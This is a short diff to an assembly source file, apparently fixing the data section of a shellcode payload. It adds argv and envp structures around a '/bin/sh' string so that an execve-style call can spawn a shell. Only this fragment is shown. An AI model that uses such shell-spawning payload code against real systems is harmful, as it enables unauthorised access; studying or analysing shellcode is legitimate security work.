@@ -37,7 +37,9 @@ payload:
 
 file_to_run:
         .ascii  "/bin/sh\0"
-        .ascii  file_to_run
+argv:
+        .dq     file_to_run
+envp:
         .ascii  "\0\0\0\0\0\0\0\0"
 
 callptr:
